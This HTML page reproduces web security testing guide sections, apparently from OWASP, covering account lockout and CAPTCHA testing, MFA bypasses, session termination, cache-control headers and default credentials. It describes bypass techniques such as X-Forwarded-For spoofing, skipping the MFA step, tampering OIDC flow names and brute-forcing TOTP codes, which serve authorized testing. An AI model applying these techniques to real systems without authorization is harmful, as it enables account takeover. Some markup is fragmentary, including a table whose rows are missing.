      <h2>How to Test</h2>
      <h3>Lockout Mechanism</h3>
      <p>To test the strength of lockout mechanisms, you will need access to an account that you are willing or can afford to lock. If you have only one account with which you can log on to the web application, perform this test at the end of your test plan to avoid losing testing time by being locked out.</p>
      <p>To evaluate the account lockout mechanism&rsquo;s ability to mitigate brute force password guessing, attempt an invalid log in by using the incorrect password a number of times, before using the correct password to verify that the account was locked out. An example test may be as follows:</p>
      <ol>
          <li>Attempt to log in with an incorrect password 3 times.</li>
          <li>Successfully log in with the correct password, thereby showing that the lockout mechanism doesn&rsquo;t trigger after 3 incorrect authentication attempts.</li>
          <li>Attempt to log in with an incorrect password 4 times.</li>
          <li>Successfully log in with the correct password, thereby showing that the lockout mechanism doesn&rsquo;t trigger after 4 incorrect authentication attempts.</li>
          <li>Attempt to log in with an incorrect password 5 times.</li>
          <li>Attempt to log in with the correct password. The application returns &ldquo;Your account is locked out.&rdquo;, thereby confirming that the account is locked out after 5 incorrect authentication attempts.</li>
          <li>Attempt to log in with the correct password 5 minutes later. The application returns &ldquo;Your account is locked out.&rdquo;, thereby showing that the lockout mechanism does not automatically unlock after 5 minutes.</li>
          <li>Attempt to log in with the correct password 10 minutes later. The application returns &ldquo;Your account is locked out.&rdquo;, thereby showing that the lockout mechanism does not automatically unlock after 10 minutes.</li>
          <li>Successfully log in with the correct password 15 minutes later, thereby showing that the lockout mechanism automatically unlocks after a 10 to 15 minute period.</li>
      </ol>
      <p>A CAPTCHA may hinder brute force attacks, but they can come with their own set of weaknesses, and should not replace a lockout mechanism. A CAPTCHA mechanism may be bypassed if implemented incorrectly. CAPTCHA flaws include:</p>
      <ol>
          <li>Easily defeated challenge, such as arithimetic or limited question set.</li>
          <li>CAPTCHA checks for HTTP response code instead of response success.</li>
          <li>CAPTCHA server-side logic defaults to a successful solve.</li>
          <li>CAPTCHA challenge result is never validated server-side.</li>
          <li>CAPTCHA input field or parameter is manually processed, and is improperly validated or escaped.</li>
      </ol>
      <p>To evaluate CAPTCHA effectiveness:</p>
      <ol>
          <li>Assess CAPTCHA challenges and attempt automating solutions depending on difficulty.</li>
          <li>Attempt to submit request without solving CAPTCHA via the normal UI mechanism(s).</li>
          <li>Attempt to submit request with intentional CAPTCHA challenge failure.</li>
          <li>Attempt to submit request without solving CAPTCHA (assuming some default values may be passed by client-side code, etc) while using a testing proxy (request submitted directly server-side).</li>
          <li>Attempt to fuzz CAPTCHA data entry points (if present) with common injection payloads or special characters sequences.</li>
          <li>Check if the solution to the CAPTCHA might be the alt-text of the image(s), filename(s), or a value in an associated hidden field.</li>
          <li>Attempt to re-submit previously identified known good responses.</li>
          <li>Check if clearing cookies causes the CAPTCHA to be bypassed (for example if the CAPTCHA is only shown after a number of failures).</li>
          <li>If the CAPTCHA is part of a multi-step process, attempt to simply access or complete a step beyond the CAPTCHA (for example if CAPTCHA is the first step in a login process, try simply submitting the second step [username and password]).</li>
          <li>Check for alternative methods that might not have CAPTCHA enforced, such as an API endpoint meant to facilitate mobile app access.</li>
      </ol>
      <p>Repeat this process to every possible functionality that could require a lockout mechanism.</p>
      <h3>Unlock Mechanism</h3>
      <p>To evaluate the unlock mechanism&rsquo;s resistance to unauthorized account unlocking, initiate the unlock mechanism and look for weaknesses. Typical unlock mechanisms may involve secret questions or an emailed unlock link. The unlock link should be a unique one-time link, to stop an attacker from guessing or replaying the link and performing brute force attacks in batches.</p>
      <p>Note that an unlock mechanism should only be used for unlocking accounts. It is not the same as a password recovery mechanism, yet could follow the same security practices.</p>
      <h2>Remediation</h2>
      <p>Apply account unlock mechanisms depending on the risk level. In order from lowest to highest assurance:</p>
      <ol>
          <li>Time-based lockout and unlock.</li>
          <li>Self-service unlock (sends unlock email to registered email address).</li>
          <li>Manual administrator unlock.</li>
          <li>Manual administrator unlock with positive user identification.</li>
      </ol>
      <p>Factors to consider when implementing an account lockout mechanism:</p>
      <ol>
          <li>What is the risk of brute force password guessing against the application?</li>
          <li>Is a CAPTCHA sufficient to mitigate this risk?</li>
          <li>Is a client-side lockout mechanism being used (e.g., JavaScript)? (If so, disable the client-side code to test.)</li>
          <li>Number of unsuccessful log in attempts before lockout. If the lockout threshold is to low then valid users may be locked out too often. If the lockout threshold is to high then the more attempts an attacker can make to brute force the account before it will be locked. Depending on the application&rsquo;s purpose, a range of 5 to 10 unsuccessful attempts is typical lockout threshold.</li>
          <li>How will accounts be unlocked? &nbsp; &nbsp;<ol>
                  <li>Manually by an administrator: this is the most secure lockout method, but may cause inconvenience to users and take up the administrator&rsquo;s &ldquo;valuable&rdquo; time. &nbsp; &nbsp; &nbsp; &nbsp;<ol>
                          <li>Note that the administrator should also have a recovery method in case his account gets locked.</li>
                          <li>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>
                          <li>This unlock mechanism may lead to a denial-of-service attack if an attacker&rsquo;s goal is to lock the accounts of all users of the web application.</li>
                      </ol>
                  </li>
                  <li>&nbsp; &nbsp; &nbsp;</li>
                  <li>After a period of time: What is the lockout duration? Is this sufficient for the application being protected? E.g. a 5 to 30 minute lockout duration may be a good compromise between mitigating brute force attacks and inconveniencing valid users.</li>
                  <li>&nbsp; &nbsp; &nbsp;</li>
                  <li>Via a self-service mechanism: As stated before, this self-service mechanism must be secure enough to avoid that the attacker can unlock accounts himself.</li>
              </ol>

      <h1>Testing Multi-Factor Authentication (MFA)</h1></br>
     
      <h4>Many applications implement Multi-Factor Authentication (MFA) as an additional layer of security to protect the login process. This is also known as two-factor authentication (2FA) or two-step verification (2SV) - although these are not strictly the same thing. MFA means asking the user to provide <em>at least</em> two different <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication#types-of-mfa">authentication factors</a> when logging in.</h4>
      <p>MFA adds additional complexity to both the authentication functionality, and also to other security-related areas (such as credential management and password recovery), meaning that it is critical for it to be implemented in a correct and robust manner.</p>
      <h2>Test Objectives</h2>
      <ul>
          <li>Identify the type of MFA used by the application.</li>
          <li>Determine whether the MFA implementation is robust and secure.</li>
          <li>Attempt to bypass the MFA.</li>
      </ul>
      <h2>How to Test</h2>
      <h3>Types of MFA</h3>
      <p>MFA means that <em>at least</em> two of the following factors are required to authentication:</p>
      <table>
          <thead>
              <tr>
                  <th>Factor</th>
                  <th>Examples</th>
              </tr>
          </thead>
          <tbody>
              <tr>
                  <td>Something You Know</td>
                  <td>Passwords, PINs and security questions.</td>
              </tr>
              <tr>
                  <td>Something You Have</td>
                  <td>Hardware or software tokens, certificates, email*, SMS, and phone calls.</td>
              </tr>
              <tr>
                  <td>Something You Are</td>
                  <td>Fingerprints, facial recognition, iris scans, handprint scans and behavioural factors.</td>
              </tr>
              <tr>
                  <td>Location</td>
                  <td>Source IP ranges, and geolocation.</td>
              </tr>
          </tbody>
      </table>
      <p>* Email only really constitutes &ldquo;something you have&rdquo; if the email account itself is protected with MFA. As such, it should be considered weaker than other alternatives such as certificates or TOTP, and may not be accepted as MFA under some definitions.</p>
      <p>Note that requiring multiple examples of a single factor (such as needing both a password and a PIN) <strong>does not constitute MFA</strong>, although it may provide some security benefits over a simple password, and may be considered two-step verification (2SV).</p>
      <p>Due to the complexity of implementing biometrics in a browser-based environment, &ldquo;Something You Are&rdquo; is rarely used for web applications, although it is starting to be adopted using standards such as WebAuthn. The most common second factor is &ldquo;Something You Have&rdquo;.</p>
      <h3>Check for MFA Bypasses</h3>
      <p>The first step for testing MFA is to identify all of the authentication functionality in the application, which may include:</p>
      <ul>
          <li>The main login page.</li>
          <li>Security critical functionality (such as disabling MFA or changing a password).</li>
          <li>Federated login providers.</li>
          <li>API endpoints (from both the main web interface and mobile apps).</li>
          <li>Alternative (non-HTTP) protocols.</li>
          <li>Test or debug functionality.</li>
      </ul>
      <p>All of the different login methods should be reviewed, to ensure that MFA is enforced consistently. If some methods do not require MFA, then these can provide a simple method to bypass them.</p>
      <p>If the authentication is done in multiple steps then it may be possible to bypass it by completing the first step of the authentication process (entering the username and password), and then force-browsing to the application or making direct API requests without completing the second stage (entering the MFA code).</p>
      <p>If the authentication is using a OpenID Connect (OIDC) provider that allows custom authentication flows (or policies) such as Azure B2C, there may be multiple flows defined, some of which may not require MFA. For example if the application authenticates with a flow called <code>B2C_1_SignInWithMFA</code>, then try tampering that to <code>B2C_1_SignIn</code>, <code>B2C_1_SignInWithoutMFA</code> or other similar values.</p>
      <p>In some cases, there may also be intentional MFA bypasses implemented, such as not requiring MFA:</p>
      <ul>
          <li>From specific IP addresses (which may be spoofable using the <code>X-Forwarded-For</code> HTTP header).</li>
          <li>When a specific HTTP header is set (such as a non-standard header like <code>X-Debug</code>).</li>
          <li>For a specific hard-coded account (such as a &ldquo;root&rdquo; or &ldquo;breakglass&rdquo; account).</li>
      </ul>
      <p>Where an application supports both local and federated logins, it may be possible to bypass the MFA if there is no strong separation between these two types of accounts. For example, if a user registers a local account and configures MFA for it, but does not have MFA configured on their account on the federated login provider, it may be possible for an attacker to re-register (or link) a federated account on the target application with the same email address by compromising the user&rsquo;s account on the federated login provider.</p>
      <p>Finally, if the MFA is implemented on a different system to the main application (such as on a reverse proxy, in order to protect a legacy application that does not natively support MFA), then it may be possible to bypass it by connecting directly to the backend application server, as discussed in the guide on how to <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture#content-delivery-network-cdn">map the application architecture</a>.</p>
      <h3>Check MFA Management</h3>
      <p>The functionality used to manage MFA from inside the user&rsquo;s account should be tested for vulnerabilities, including:</p>
      <ul>
          <li>Is the user required to re-authenticate to remove or change MFA settings?</li>
          <li>Is the MFA management functionality vulnerable to <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery">cross-site request forgery</a>?</li>
          <li>Can other users&rsquo; MFA setting be modified through <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References">IDOR vulnerabilities</a>?</li>
      </ul>
      <h3>Check MFA Recovery Options</h3>
      <p>Many applications will provide users with a way to regain access to their account if they are unable to authenticate with their second factor (for example if they have lost their phone). These mechanisms can often represent a significant weakness in the application, as they effectively allow the second authentication factor to be bypassed.</p>
      <h4>Recovery Codes</h4>
      <p>Some applications will provide the user with a list of recovery or backup codes when they enable MFA, which can be used to login. These should be checked to ensure:</p>
      <ul>
          <li>They are sufficiently long and complex to protect against brute-force attacks.</li>
          <li>They are securely generated.</li>
          <li>They can only be used once.</li>
          <li>Brute-force protection is in place (such as account lockout).</li>
          <li>The user is notified (via email, SMS, etc) when a code is used.</li>
      </ul>
      <p>See the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html#backup-codes">&ldquo;Backup Codes&rdquo; section in the Forgotten Password Cheat Sheet</a> for further details.</p>
      <h4>MFA Reset Process</h4>
      <p>If the application implements an MFA reset process, this should be tested in the same way that the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities">password reset process</a> is tested. It is important that this process is <em>at least</em> as strong as the MFA implementation for the application.</p>
      <h4>Alternative Authentication</h4>
      <p>Some applications will allow the user to prove their identity through other means, such as the use of <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer">security questions</a>. This usually represents a significant weakness, as security questions provide a far lower level of security than MFA.</p>
      <h3>One-Time Passwords</h3>
      <p>The most common form of MFA is the one of One-Time Passwords (OTPs), which are typically six-digit numeric codes (although they can be longer or shorter). These can either be generated by both the server and the user (for example, with an authenticator app), or can be generated on the server and sent to the user. There are various ways that this OTP can be provided to the user, including:</p>
      <p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>
      <table>
          <thead>
              <tr>
                  <th>Type</th>
                  <th>Description</th>
              </tr>
          </thead>
          <tbody>
              <tr>
                  <td>HMAC One-Time Password (HOPT)</td>
                  <td>Generates a code based on the HMAC of a secret and a shared counter.</td>
              </tr>
              <tr>
                  <td>Time-based One-Time Password (TOTP)</td>
                  <td>Generates a code based on HMAC of a secret and the current time.</td>
              </tr>
              <tr>
                  <td>Email</td>
                  <td>Sends a code via email.</td>
              </tr>
              <tr>
                  <td>SMS</td>
                  <td>Sends a code via SMS.</td>
              </tr>
              <tr>
                  <td>Phone</td>
                  <td>Sends a code via a voice call to a phone number.</td>
              </tr>
          </tbody>
      </table>
      <p>The OTP is typically entered after the user has provided their username and password. There are various checks that should be performed, including:</p>
      <ul>
          <li>Is the account locked out after multiple failed MFA attempts?</li>
          <li>Is the user&rsquo;s IP address blocked after multiple failed MFA attempts across different accounts?</li>
          <li>Are failed MFA attempts logged?</li>
          <li>Is the form vulnerable to injection attacks, including <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#sql-wildcard-injection">SQL wildcard injection</a>?</li>
      </ul>
      <p>Depending on the type of OTPs used, there are also some other specific checks that should be performed:</p>
      <ul>
          <li>How are OTPs sent to user (email, SMS, phone, etc) &nbsp; &nbsp;<ul>
                  <li>Is there rate limiting to prevent SMS/phone spam costing money?</li>
              </ul>
          </li>
          <li>How strong are OTPs (length and keyspace)?</li>
          <li>How long are OTPs valid for?</li>
          <li>Are multiple OTPs valid at once?</li>
          <li>Can the OTPs be used more than once?</li>
          <li>Are the OTPs tied to the correct user account or is it possible to authenticate with them on other accounts?</li>
      </ul>
      <h4>HOTP and TOTP</h4>
      <p>HOTP and TOTP codes are both based on a secret that is shared between the server and the user. For TOTP codes, this is usually provided to the user in the form of a QR code that they scan with an authenticator app (although it can also be provided as a text secret for them to manually enter).</p>
      <p>Where the secret is generated on the server, it should be checked to ensure that it is sufficiently long and complex (<a href="https://www.rfc-editor.org/rfc/rfc4226#section-4">RFC 4226</a> recommends at least 160 bits), and that it is generated using a <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation">secure random function</a>.</p>
      <p>Where the secret can be provided by the user, an appropriate minimum length should be enforced, and the input should be checked for the usual injection attacks.</p>
      <p>TOTP codes are typically valid for 30 seconds, but some applications choose to accept multiple codes (such as the previous, current, and next codes) in order to deal with differences between the system time on the server and on the user&rsquo;s device. Some applications may allow multiple codes on either side of the current one, which may make it easier for an attacker to guess or brute-force the code. The table below shows the chance of successfully brute-forcing an OTP code based on an attacker being able to make 10 requests a second, for applications that accept either only the current code, or multiple codes (see <a href="https://www.codasecurity.co.uk/articles/mfa-testing#case-study---brute-forcing-totp">this article</a> for the calculations behind the table).</p>
      <p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>

          </tbody>
      </table>
      <h4>Email, SMS, and Phone</h4>
      <p>Where codes are generated by the server and sent to the client, the following areas should be considered:</p>
      <ul>
          <li>Is the transport mechanism (email, SMS, or voice) secure enough for the application?</li>
          <li>Are the codes sufficiently long and complex?</li>
          <li>Are the codes generated using a <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation">secure random function</a>?</li>
          <li>How long are the codes valid for?</li>
          <li>Are multiple codes valid at once, or does generating a new code invalidate the previous one? &nbsp; &nbsp;<ul>
                  <li>Could this be used to block access to an account by repeatedly requesting codes?</li>
              </ul>
          </li>
          <li>Is there sufficient rate-limiting to prevent an attacker requesting large numbers of codes? &nbsp; &nbsp;<ul>
                  <li>Large numbers of emailed code may get the server blocked for sending spam.</li>
                  <li>&nbsp; &nbsp; &nbsp;</li>
                  <li>Large numbers of SMS or voice calls may cost money, or be used to harass a user.</li>
              </ul>
          </li>
      </ul>
      <h3>Mobile Apps and Push Notifications</h3>
      <p>An alternative approach to OTP codes is to send a push notification to the user&rsquo;s mobile phone, which they can either approve or deny. This method is less common, as it requires the user to install an application-specific authenticator.</p>
      <p>Properly evaluating the security of this requires the scope of testing to be expanded to cover both the mobile app, and any supporting APIs or services used by it; meaning that it would often be outside of the scope of a traditional web application test. However, there are a couple of simple checks that can be performed without testing the mobile app, including:</p>
      <ul>
          <li>Does the notification provide sufficient context (IP addresses, location, etc) for the user to make an informed decision about whether to approve or deny it?</li>
          <li>Is there any kind of challenge and response mechanism (such as providing a code on the site that the user needs to enter into the app - often called &ldquo;number matching&rdquo; or &ldquo;number challenge&rdquo;)?</li>
          <li>Is there any rate limiting or mechanisms to prevent the user from being spammed with notifications in the hope that they will just blindly accept one?</li>
      </ul>
      <h3>IP Address and Location Filtering</h3>
      <p>One of the factors that is sometimes used with MFA is location (&ldquo;somewhere you are&rdquo;), although whether this constitutes a proper authentication factor is debatable. In the context of a web application, this typically means restricting access to specific IP addresses, or not prompting the user for a second factor as long as they are connecting from a specific trusted IP address. A common scenario for this would be to authenticate users with just their password when connecting from the office IP ranges, but requiring an OTP code when they connect from elsewhere.</p>
      <p>Depending on the implementation, it may be possible for a user to spoof a trusted IP address by setting the <code>X-Forwarded-For</code> header, which could allow them to bypass this check. Note that if the application does not correctly sanitize the contents of this header, it may also be possible to carry out attack such as SQL injection here. If the application supports IPv6, then this should also be checked to ensure that appropriate restrictions are applied to those connections.</p>
      <p>Additionally, the trusted IP addresses should be reviewed to ensure that they do not present any weaknesses, such as if they include:</p>
      <ul>
          <li>IP addresses that could be accessible by untrusted users (such as the guest wireless networks in an office).</li>
          <li>Dynamically assigned IP address that could change.</li>
          <li>Public network ranges where an attacker could host their own system (such as Azure or AWS).</li>
      </ul>
      <h3>Certificates and Smartcards</h3>
      <p>Transport Layer Security (TLS) is commonly used to encrypt traffic between the client and the server, and to provide a mechanism for the client to confirm the identity of the server (by comparing Common Name (CN) or Subject Alternative Name (SAN) on the certificate to the requested domain). However, it can also provide a mechanism for the server to confirm the identity of the client, known as client certificate authentication or mutual TLS (mTLS). A full discussion of client certificate authentication is outside of the scope of this guide, but the key principle is that the user presents a digital certificate (stored either on their machine or on a smartcard), which is validated by the server.</p>
      <p>The first step when testing is to determine whether the target application restricts the Certificate Authorities (CAs) that are trusted to issue certificates. This information can be obtained using various tools, or by manually examining the TLS handshake. The simplest way is to use OpenSSL&rsquo;s <code>s_client</code>:</p>
      <div>
          <div>
              <pre><code>$ openssl s_client -connect example:443
      [...]
      Acceptable client certificate CA names
      C = US, ST = Example, L = Example, O = Example Org, CN = Example Org Root Certificate Authority
      Client Certificate Types: RSA sign, DSA sign, ECDSA sign
      </code></pre>
          </div>
      </div>
      <p>If there are no restrictions, then it may be possible to authenticate using a certificate from a different CA. If there are restrictions but they are badly implemented, it may be possible to create a local CA with the correct name (&ldquo;Example Org Root Certificate Authority&rdquo; in the example above), and to use this new CA to sign client certificates.</p>
      <p>If a valid certificate can be obtained, then it should also be verified that the certificate can only be used for the user that it is issued for (i.e, that you can&rsquo;t use a certificate issued to Alice to authenticate on Bob&rsquo;s account). Additionally, certificates should be checked to ensure that they have neither expired nor been revoked.</p>

    <h4>Session termination is an important part of the session lifecycle. Reducing to a minimum the lifetime of the session tokens decreases the likelihood of a successful session hijacking attack. This can be seen as a control against preventing other attacks like Cross Site Scripting and Cross Site Request Forgery. Such attacks have been known to rely on a user having an authenticated session present. Not having a secure session termination only increases the attack surface for any of these attacks.</h4>
    <p>A secure session termination requires at least the following components:</p>
    <ul>
        <li>Availability of user interface controls that allow the user to manually log out.</li>
        <li>Session termination after a given amount of time without activity (session timeout).</li>
        <li>Proper invalidation of server-side session state.</li>
    </ul>
    <p>There are multiple issues which can prevent the effective termination of a session. For the ideal secure web application, a user should be able to terminate at any time through the user interface. Every page should contain a log out button on a place where it is directly visible. Unclear or ambiguous log out functions could cause the user not trusting such functionality.</p>
    <p>Another common mistake in session termination is that the client-side session token is set to a new value while the server-side state remains active and can be reused by setting the session cookie back to the previous value. Sometimes only a confirmation message is shown to the user without performing any further action. This should be avoided.</p>
    <p>Some web application frameworks rely solely on the session cookie to identify the logged-on user. The user&rsquo;s ID is embedded in the (encrypted) cookie value. The application server does not do any tracking on the server-side of the session. When logging out, the session cookie is removed from the browser. However, since the application does not do any tracking, it does not know whether a session is logged out or not. So by reusing a session cookie it is possible to gain access to the authenticated session. A well-known example of this is the Forms Authentication functionality in ASP.NET.</p>
    <p>Users of web browsers often don&rsquo;t mind that an application is still open and just close the browser or a tab. A web application should be aware of this behavior and terminate the session automatically on the server-side after a defined amount of time.</p>
    <p>The usage of a single sign-on (SSO) system instead of an application-specific authentication scheme often causes the coexistence of multiple sessions which have to be terminated separately. For instance, the termination of the application-specific session does not terminate the session in the SSO system. Navigating back to the SSO portal offers the user the possibility to log back in to the application where the log out was performed just before. On the other side a log out function in a SSO system does not necessarily cause session termination in connected applications.</p>
    <h2>Test Objectives</h2>
    <ul>
        <li>Assess the logout UI.</li>
        <li>Analyze the session timeout and if the session is properly killed after logout.</li>
    </ul>
    <h2>How to Test</h2>
    <h3>Testing for Log Out User Interface</h3>
    <p>Verify the appearance and visibility of the log out functionality in the user interface. For this purpose, view each page from the perspective of a user who has the intention to log out from the web application.</p>
    <blockquote>
        <p>There are some properties which indicate a good log out user interface:</p>&nbsp;<ul>
            <li>A log out button is present on all pages of the web application.</li>
            <li>The log out button should be identified quickly by a user who wants to log out from the web application.</li>
            <li>After loading a page the log out button should be visible without scrolling.</li>
            <li>Ideally the log out button is placed in an area of the page that is fixed in the view port of the browser and not affected by scrolling of the content.</li>
        </ul>
    </blockquote>
    <h3>Testing for Server-Side Session Termination</h3>
    <p>First, store the values of cookies that are used to identify a session. Invoke the log out function and observe the behavior of the application, especially regarding session cookies. Try to navigate to a page that is only visible in an authenticated session, e.g. by usage of the back button of the browser. If a cached version of the page is displayed, use the reload button to refresh the page from the server. If the log out function causes session cookies to be set to a new value, restore the old value of the session cookies and reload a page from the authenticated area of the application. If these test don&rsquo;t show any vulnerabilities on a particular page, try at least some further pages of the application that are considered as security-critical, to ensure that session termination is recognized properly by these areas of the application.</p>
    <blockquote>
        <p>No data that should be visible only by authenticated users should be visible on the examined pages while performing the tests. Ideally the application redirects to a public area or a log in form while accessing authenticated areas after termination of the session. It should be not necessary for the security of the application, but setting session cookies to new values after log out is generally considered as good practice.</p>
    </blockquote>
    <h3>Testing for Session Timeout</h3>
    <p>Try to determine a session timeout by performing requests to a page in the authenticated area of the web application with increasing delays. If the log out behavior appears, the used delay matches approximately the session timeout value.</p>
    <blockquote>
        <p>The same results as for server-side session termination testing described before are excepted by a log out caused by an inactivity timeout.</p>&nbsp;<p>The proper value for the session timeout depends on the purpose of the application and should be a balance of security and usability. In a banking applications it makes no sense to keep an inactive session more than 15 minutes. On the other side a short timeout in a wiki or forum could annoy users which are typing lengthy articles with unnecessary log in requests. There timeouts of an hour and more can be acceptable.</p>
    </blockquote>
    <h3>Testing for Session Termination in Single Sign-On Environments (Single Sign-Off)</h3>
    <p>Perform a log out in the tested application. Verify if there is a central portal or application directory which allows the user to log back in to the application without authentication. Test if the application requests the user to authenticate, if the URL of an entry point to the application is requested. While logged in in the tested application, perform a log out in the SSO system. Then try to access an authenticated area of the tested application.</p>
    <blockquote>
        <p>It is expected that the invocation of a log out function in a web application connected to a SSO system or in the SSO system itself causes global termination of all sessions. An authentication of the user should be required to gain access to the application after log out in the SSO system and connected application.</p>

		  <h4>Cache management is a critical aspect of web performance and security. It involves controlling how content is stored and retrieved from caches to ensure that users receive the most up-to-date information while also optimizing performance. Proper cache management can help reduce server load, improve response times, and enhance the user experience, while also protecting sensitive data from being cached improperly.</h4>

    <h2>What is Cache?</h2>
    <p>Cache refers to a mechanism used to temporarily store frequently accessed data in a location that allows faster retrieval. For web applications, this could mean storing static content like images, CSS files, or HTML documents so that they don't need to be reloaded from the server every time a user visits a page.</p>

    <h2>Why is Cache Management Important?</h2>
    <p>Effective cache management plays an important role in both performance and security:</p>
    <ul>
        <li><strong>Improves Performance:</strong> By caching static content on the client-side or at intermediary proxies, web applications can reduce latency and minimize server load, resulting in faster response times.</li>
        <li><strong>Reduces Bandwidth Usage:</strong> Caching reduces the number of requests to the server, which can save bandwidth costs, especially for high-traffic websites.</li>
        <li><strong>Ensures Fresh Content:</strong> Proper cache management ensures that users always receive up-to-date content, avoiding the risks of serving outdated or stale information.</li>
        <li><strong>Enhances Security:</strong> Cache management also helps in ensuring that sensitive data is not stored or exposed in the cache, protecting it from unauthorized access.</li>
    </ul>

    <h2>Cache-Control Headers</h2>
    <p>The most common way to control caching behavior is through HTTP headers, particularly the <strong>Cache-Control</strong> header. This header provides directives for browsers and caching servers to control how and for how long content is cached.</p>

    <h3>Important Cache-Control Directives:</h3>
    <ul>
        <li><strong>max-age:</strong> Specifies the maximum amount of time, in seconds, that a resource is considered fresh. For example, <code>max-age=3600</code> means the resource is cached for 1 hour.</li>
        <li><strong>no-cache:</strong> Instructs the browser to revalidate the cached content with the server before using it.</li>
        <li><strong>no-store:</strong> Prevents caching of the resource. The content is not stored in the cache at all and will be fetched from the server every time.</li>
        <li><strong>public:</strong> Indicates that the resource is cacheable by any cache (browser or CDN) and can be stored even if the response is typically private.</li>
        <li><strong>private:</strong> Specifies that the resource is cacheable only by the user's browser and should not be cached by intermediary caches like CDNs.</li>
        <li><strong>must-revalidate:</strong> Forces caches to check with the origin server if the resource is still valid after the cache expires, even if the content is still within the max-age window.</li>
        <li><strong>immutable:</strong> Tells the browser that the resource will never change, so it can be cached indefinitely.</li>
    </ul>

    <h2>Cache-Control in Action</h2>
    <p>Below is an example of how to implement Cache-Control headers for different use cases:</p>
    <ul>
        <li><strong>For Static Content (e.g., images, CSS, JavaScript):</strong>
            <pre>Cache-Control: public, max-age=31536000</pre>
            This instructs the browser to cache the content for a year (31536000 seconds).</li>
        <li><strong>For Dynamic Content (e.g., HTML pages):</strong>
            <pre>Cache-Control: no-cache, must-revalidate</pre>
            This ensures that the page is revalidated with the server before being used from the cache.</li>
        <li><strong>For Sensitive Information (e.g., login pages, personal data):</strong>
            <pre>Cache-Control: no-store</pre>
            This prevents any sensitive information from being cached by the browser or any intermediate caches.</li>
    </ul>

    <h2>Cache Busting Techniques</h2>
    <p>Sometimes, cached content may need to be updated before its cache expires (for example, after deploying new versions of a site). Cache busting is the process of forcing the browser to fetch the new version of the content. Common cache busting techniques include:</p>
    <ul>
        <li><strong>Query String Versioning:</strong> Adding a query parameter to the URL, such as <code>example.com/style.css?v=2.0</code>, can force the browser to fetch a new version of the resource.</li>
        <li><strong>File Name Versioning:</strong> Changing the file name when a new version is deployed, such as <code>style.v2.css</code>, ensures that the browser treats it as a new resource and doesn't rely on the cached version.</li>
        <li><strong>Content Hashing:</strong> Generating a unique hash based on the content of the file (e.g., <code>style.abc123.css</code>) can also ensure that the browser fetches the updated resource whenever the file content changes.</li>
    </ul>

    <h2>Cache Management Best Practices</h2>
    <p>To maximize both performance and security, it's important to follow best practices for cache management:</p>
    <ul>
        <li><strong>Use Appropriate Cache-Control Headers:</strong> Define caching rules that fit the nature of the content (static vs. dynamic) and the sensitivity of the data (public vs. private).</li>
        <li><strong>Ensure Sensitive Data is Not Cached:</strong> Use the <code>no-store</code> directive for sensitive resources such as login pages, personal data, and payment forms to prevent accidental caching.</li>
        <li><strong>Leverage Content Delivery Networks (CDNs):</strong> Use CDNs to cache content closer to the user and reduce server load, especially for static resources like images, stylesheets, and scripts.</li>
        <li><strong>Monitor Cache Expiration:</strong> Regularly review cache expiration times and purge outdated content when necessary to ensure users always get the most current version of resources.</li>
        <li><strong>Use Cache Invalidation:</strong> Implement cache invalidation strategies, such as query string or file name versioning, to ensure users always have access to updated content.</li>
    </ul>

        <h1 id="testing-for-default-credentials">Testing for Default Credentials</h1>
     </br>
      <p>Many web applications and hardware devices have default passwords for the built-in administrative account. Although in some cases these can be randomly generated, they are often static, meaning that they can be easily guessed or obtained by an attacker.</p>
      <p>Additionally, when new users are created on the applications, these may have predefined passwords set. These could either be generated automatically by the application, or manually created by staff. In both cases, if they are not generated in a secure manner, the passwords may be possible for an attacker to guess.</p>
      <h2 id="test-objectives">Test Objectives</h2>
      <ul>
      <li>Determine whether the application has any user accounts with default passwords.</li>
      <li>Review whether new user accounts are created with weak or predictable passwords.</li>
      </ul>
      <h2 id="how-to-test">How to Test</h2>
      <h3 id="testing-for-vendor-default-credentials">Testing for Vendor Default Credentials</h3>
      <p>The first step to identifying default passwords is to identify the software that is in use. This is covered in detail in the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/README">Information Gathering</a> section of the guide.</p>
